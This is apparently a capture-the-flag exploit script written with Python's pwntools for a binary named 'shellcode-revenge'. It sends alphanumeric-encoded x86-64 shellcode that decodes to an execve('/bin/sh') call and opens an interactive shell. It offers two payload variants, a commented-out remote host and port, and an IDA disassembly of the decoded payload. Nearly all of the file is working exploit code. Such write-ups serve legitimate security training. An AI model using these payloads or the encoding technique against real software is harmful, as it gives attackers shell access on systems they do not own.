from pwn import *

# the ida could not convert asm code to fake c code, 
# but we just need to patch the 'call rax' and change it to 'nop',
# we could get the fake c code,
# program is easy,just call our input,
# but input is limited to numbers and letters,
# so we need encode the shellcode to get shell


# context.log_level = 'debug'
context.arch='amd64'

p=process('./shellcode-revenge')
# p = remote('38.39.244.2',28065)
p.recvuntil('Show me your magic!')

def way1():
	shellcode = 'jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c'
	# shellcode += (0x400-len(shellcode))*"QY"
	shellcode += (0x400-len(shellcode))*'RZ'
	p.send(shellcode)
	# p.send('jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c')
	# the shellcode will change the stack structure,
	# so we need to padding something to insure the stack balance,
	# otherwise,program the ragin shellcode will execve our padding,
	# so we need to padding somthing executable

	p.interactive()


	# [stack]:00007FFD00D68D90 push    5Ah
	# [stack]:00007FFD00D68D92 push    rsp
	# [stack]:00007FFD00D68D93 pop     rcx
	# [stack]:00007FFD00D68D94 pop     rax
	# [stack]:00007FFD00D68D95 xor     al, 55h
	# [stack]:00007FFD00D68D97 push    rax
	# [stack]:00007FFD00D68D98 pop     rax
	# [stack]:00007FFD00D68D99 imul    edi, [rcx], 41h
	# [stack]:00007FFD00D68D9C movsxd  rsi, dword ptr [rcx+rdi]
	# [stack]:00007FFD00D68DA0 xor     [rcx+rdi], esi
	# [stack]:00007FFD00D68DA3 push    3030474Ah
	# [stack]:00007FFD00D68DA8 pop     rax
	# [stack]:00007FFD00D68DA9 xor     eax, 30304245h
	# [stack]:00007FFD00D68DAE push    rax
	# [stack]:00007FFD00D68DAF pop     rax
	# [stack]:00007FFD00D68DAF ; ---------------------------------------------------------------------------
	# [stack]:00007FFD00D68DB0 db  2Fh ; /
	# [stack]:00007FFD00D68DB1 db  62h ; b
	# [stack]:00007FFD00D68DB2 db  69h ; i
	# [stack]:00007FFD00D68DB3 db  6Eh ; n
	# [stack]:00007FFD00D68DB4 db  2Fh ; /
	# [stack]:00007FFD00D68DB5 db  73h ; s
	# [stack]:00007FFD00D68DB6 db  68h ; h
	# [stack]:00007FFD00D68DB7 db    0
	# [stack]:00007FFD00D68DB8 db  71h ; q
	# [stack]:00007FFD00D68DB9 db  30h ; 0
	# [stack]:00007FFD00D68DBA db  31h ; 1
	# [stack]:00007FFD00D68DBB db  71h ; q
	# [stack]:00007FFD00D68DBC db  30h ; 0
	# [stack]:00007FFD00D68DBD db  48h ; H
	# [stack]:00007FFD00D68DBE db  63h ; c
	# [stack]:00007FFD00D68DBF db  71h ; q
	# [stack]:00007FFD00D68DC0 db  34h ; 4
	# [stack]:00007FFD00D68DC1 ; ---------------------------------------------------------------------------
	# [stack]:00007FFD00D68DC1 xor     [rcx+34h], esi
	# [stack]:00007FFD00D68DC4 movsxd  rdi, dword ptr [rcx+30h]
	# [stack]:00007FFD00D68DC8 movsxd  rsi, dword ptr [rcx+30h]
	# [stack]:00007FFD00D68DCC push    rdi
	# [stack]:00007FFD00D68DCD pop     rdx
	# [stack]:00007FFD00D68DCE push    5A58555Ah
	# [stack]:00007FFD00D68DD3 pop     rax
	# [stack]:00007FFD00D68DD4 xor     eax, 34313775h
	# [stack]:00007FFD00D68DD9 xor     [rcx+30h], eax
	# [stack]:00007FFD00D68DDC push    6A51475Ah
	# [stack]:00007FFD00D68DE1 pop     rax
	# [stack]:00007FFD00D68DE2 xor     eax, 6A393475h
	# [stack]:00007FFD00D68DE7 xor     [rcx+34h], eax
	# [stack]:00007FFD00D68DEA xor     rdi, [rcx+30h]
	# [stack]:00007FFD00D68DEE pop     rax
	# [stack]:00007FFD00D68DEF push    rdi
	# [stack]:00007FFD00D68DF0 push    58h
	# [stack]:00007FFD00D68DF2 movsxd  rdi, dword ptr [rcx]
	# [stack]:00007FFD00D68DF5 xor     rdi, [rcx]
	# [stack]:00007FFD00D68DF8 pop     rax
	# [stack]:00007FFD00D68DF9 push    rsp
	# [stack]:00007FFD00D68DFA xor     rdi, [rcx]
	# [stack]:00007FFD00D68DFD xor     al, 63h
	# [stack]:00007FFD00D68DFF push    rcx
	# [stack]:00007FFD00D68E00 pop     rcx
	# ......
	# [stack]:00007FFD00D6914D push    rcx
	# [stack]:00007FFD00D6914E pop     rcx
	# [stack]:00007FFD00D6914F syscall    
	# 
	# in order to execute the syscall, we need padding sonthong wich ragin shellcode will execute and we need make stack banlance, 
	# so just pading QY(push rcx;pop rcx)
	# 
	# >>> asm('push rdx;pop rdx')
	# 'RZ'
	# >>> asm('push rcx;pop rcx')
	# 'QY'

# or we can change a shellcode which only contains numbers and letters
def way2():
	shellcode = "PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"
	p.send(shellcode)
	sleep(0.1) # make sure we can get shell
	p.interactive()

# way1()
way2()

# we could not use the shellcode which pwntools offered encode by AE64,
# when we debug it,we can find that the encoded shellcode could not set the rax to currect value to call syscall